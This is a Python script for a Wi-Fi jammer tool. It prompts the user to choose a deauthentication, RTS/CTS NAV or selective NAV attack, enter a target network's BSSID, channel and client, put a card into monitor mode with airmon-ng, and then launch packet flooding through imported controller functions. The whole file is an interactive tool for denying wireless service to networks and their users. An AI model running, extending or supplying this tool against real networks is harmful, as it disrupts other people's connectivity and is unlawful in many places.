import sys
sys.path.append("..")
from controller.controller import Controller
from libraries.utils import *

if __name__ == "__main__":

    ctl = Controller()

    print("\n")

    show("Wifi jammer")

    time.sleep(0.5)

    input("\nPress enter to start.\n")

    print("#"*40)

    attack = ""

    while attack != "Deauthentication" and attack != "RTS/CTS NAV" and attack != "selective RTS/CTS NAV":
        attack = input("Tell me the attack that you want to do:"
            "\n -Deauthentication"
            "\n -RTS/CTS NAV"
            "\n -selective RTS/CTS NAV"
            "\n : ")

    print("\n")

    try:
        network_scan()
    except KeyboardInterrupt:
        pass

    bssid = input("Tell me the BSSID of the network that you want to jam:\n")

    bssid = bssid.lower()

    channel = input("Tell me the channel of the network that you want to jam:\n")

    clear()

    #call airmon-ng to show to the user a list of available network cards on their device
    subprocess.call('airmon-ng', shell=True)

    monitor_card = input('Enter the name of the network card you want to put in monitor mode: ')

    clear()

    #print('#' * 40)
    #print('Killing conflictive processes before put the card in monitor mode.')
    #.kill_processes()

    print("Starting monitor mode on the selected device.")
    print('#' * 40)
    time.sleep(2)
    #Start monitor mode on the selected device
    monitor_mode(monitor_card, channel)

    clear()

    #call airmon-ng to show to the user a list of available network cards on their device
    subprocess.call('airmon-ng', shell=True)

    monitor_card = input('Enter the name of the network card you wish to use: ')

    clear()

    client = 'FF:FF:FF:FF:FF:FF'

    if attack != 'selective RTS/CTS NAV':

        time = input('Please enter the time you want to jam the network in minutes. You will be able to stop it pressing crtl + c. ')

        packets = calcule_paquets(attack, time)

        if attack == 'Deauthentication':
            try:
                #call airodump-ng to show stations conected
                subprocess.call('airodump-ng --bssid {} {}'.format(bssid, monitor_card), shell=True)
            except KeyboardInterrupt:
                pass

            client = input('Please enter the station you want to jam. Press enter if you want to jam all stations: ')

        if attack == "RTS/CTS NAV":
            subtype = ""
            while subtype != "RTS" and subtype != "CTS":
                subtype = input("Please tell me what king of attack do you want to do:"
                    "\n -RTS"
                    "\n -CTS"
                    "\n : ")

    card_mac = get_mac(monitor_card)

    card_mac = card_mac.lower()

    clear()

    print("Testing your card, wait a moment. You can stop it doing ctrl + c.")
    injection_test(bssid, monitor_card)

    clear()

    print("Jamming network: " + bssid + " through: " + monitor_card)

    if attack == "Deauthentication":
        ctl.deauthentication_jamming(client, bssid, packets, monitor_card)
    elif attack == "RTS/CTS NAV":
        ctl.nav_jamming(bssid, card_mac, monitor_card, False, subtype, packets, 0.03)
    elif attack == "selective RTS/CTS NAV":
        ctl.nav_jamming(bssid, card_mac, monitor_card, True, "RTS", 160, 0.0001)

    print('\nEnd of jammer.')
